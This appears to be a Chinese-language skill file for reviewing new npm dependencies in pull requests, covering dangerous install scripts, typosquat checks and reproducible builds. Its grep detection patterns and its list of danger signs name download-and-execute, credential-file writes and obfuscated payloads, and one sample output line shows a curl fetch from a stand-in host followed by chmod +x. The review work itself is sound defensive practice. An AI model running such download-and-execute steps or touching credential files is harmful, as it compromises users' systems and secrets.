---
name: supply-chain-review
description: 'PR/新依赖快速供应链评审：危险 install/postinstall 脚本检查、typosquat 相似名判断、可复现构建验证，每项附误报判据与通过/要求修改/阻断三档决策阈值。评审引入新依赖的 PR 或需快速给出新增依赖风险结论时用；与新增依赖无关的普通代码评审不用。'
whenToUse: '评审含新依赖（package.json/锁文件变更）的 PR、审查某包的 install 脚本行为、判断疑似 typosquat 包或验证构建可复现性时使用；纯业务代码、与新增依赖无关的 PR 评审不触发本技能。'
metadata:
  pack: dsh-skill-pack-security
  version: '1.2.0'
---

# 新增依赖快速评审（supply-chain-review）

目标：在 PR 评审时间内（几分钟）对新增依赖给出 **通过 / 要求修改 / 阻断** 三档结论；每条结论必须附命令证据与误报排除说明。

## 0. 确认范围

```sh
git diff <base>...HEAD --stat -- package.json pnpm-lock.yaml
git diff <base>...HEAD --unified=0 -- package.json | grep '^+'
```

样例输出：

```
 package.json      | 4 ++++
 pnpm-lock.yaml    | 12 ++++++++++++
+    "example-lib": "^2.3.0",
```

判据：无 manifest 变更 → 本技能不适用，停止；只有 devDependencies 变更 → 按"不进生产产物"整体降一档风险，但脚本检查照做。
`<base>` 用 PR 的真实 base（`git merge-base <base> HEAD` 可先确认），不要猜。

## 1. 危险 install 脚本检查（阻断级候选）

对每个新包执行：

```sh
npm view <包> scripts --json
```

样例输出：`{ "postinstall": "node scripts/download.js" }`。
危险特征清单（完整版与复核 grep 见 `references/install-script-checks.md`）：

- `curl`/`wget`/`Invoke-WebRequest` 下载可执行文件后执行；
- `base64 -d`/`eval`/`child_process.exec`/`os.system` 配合外部输入或拼接载荷；
- 写入 `~/.ssh`、`.npmrc`、`.gitconfig`、credentials、全局 shell 配置。

复核命令（解包看真实内容，不只信 manifest 描述）：

```sh
npm pack <包> --pack-destination .tmp
tar -xzf .tmp/<包>-<版本>.tgz -C .tmp
grep -rnE '(curl|wget|base64|eval|\.ssh|npmrc)' .tmp/package/package.json .tmp/package/*.js
```

样例输出：`.tmp/package/scripts/download.js:3:curl -sSL https://evil.example/x -o /tmp/x && chmod +x /tmp/x`
误报判据：**构建工具链的安装脚本是生态惯例**（esbuild、sharp、node-gyp、core-js 等）——放行判据 = 脚本行为与包用途一致 且 不触碰用户凭据/全局配置；两者任一不满足 = 阻断级。
阻断条件（任一即阻断）：下载并执行二进制、访问凭据文件、混淆载荷（base64/hex 拼装后 eval）、安装后写全局配置。
git 安装向量：依赖来自 git URL 时（DSH 的 git 安装会执行 `prepare` 脚本），`npm view` 看不到其脚本——先 `git grep -nE 'git\+https?://' -- package.json` 定位，再 `git clone --depth 1 <url> .tmp/gitdep` 后 `grep -nE '"(prepare|preinstall)"' .tmp/gitdep/package.json`；`prepare` 在安装时执行，与 postinstall 同级对待。
包体异常：`npm view <包> dist.fileCount dist.tarball --json`。判据：fileCount 异常大（如 >1000）或 tarball 域名非 `registry.npmjs.org` → 记录并人工复核。

## 2. typosquat 检查

对每个新包名：

```sh
npm view <包> time.created
npm view <包> --json | grep -E '"downloads"|"weekly"'
```

样例输出：`2026-08-10T02:00:00.000Z`（两周前创建）；downloads 字段可能不存在（说明：部分 registry 不返回该字段，缺失按"未知"处理，不据此定论）。
名称比对：与流行包逐一比对编辑距离（混淆对清单与命令见 `references/typosquat-and-reproducibility.md`），例如 `lodahs` vs `lodash`、`react-domm` vs `react-dom`。
判据：**名称与流行包编辑距离 ≤ 2 且 创建时间短/下载量极低 两条同时成立 → 阻断**；只中一条 → 要求修改并转 `dependency-audit` 投毒清单复查。
误报判据：领域完全无关的小众同名包，不因"下载量低"单条被误杀——必须"名称相似 + 上下文可疑"同时成立。

## 3. 可复现构建验证

```sh
git ls-files -- '*lock*' | head -n 5
grep -nE 'frozen-lockfile|npm ci|--frozen' .github/workflows/* 2>/dev/null
grep -c 'integrity' <锁文件>
pnpm install --frozen-lockfile
```

样例输出：锁文件路径一行；CI 命中行 `install: pnpm install --frozen-lockfile`；integrity 计数 `1234`。
判据（三要素，见 `references/typosquat-and-reproducibility.md`）：
- 锁文件已提交 + CI 冻结安装 + integrity 字段齐全 = 通过；
- 缺任一 = 要求修改；
- 缺锁文件 **且** 新增直接依赖 > 20 个 = 阻断。
- `pnpm install --frozen-lockfile` 失败样例与处理转 `dependency-audit` 第 5 节；平台差异不关冻结开关。
- CI 配置复核（PR 改了 workflow 时必查）：`git diff <base>...HEAD -- .github/workflows | grep -nE '^\+.*uses:'`——新增/改动的 `uses: <owner>/<repo>@v<数字>` 未 pin 到 commit SHA（`@<40位hex>`）→ 要求修改（tag 可被移动）；只读、不触密钥的第三方 action 记录即可，不阻断。
- 锁文件新增量复核：`git diff <base>...HEAD -- <锁文件> | grep -cE '^\+'` 与新增直接依赖数对照；声明 1 个依赖却 +500 行 → 记录并人工核对 diff 内容。

## 4. 结论与评论模板

三档定义、触发条件与 PR 评论模板见 `references/typosquat-and-reproducibility.md`。
结论必须包含：证据命令 + 输出摘要 + 误报排除说明（"我排除了 X，因为 <证据>"）。
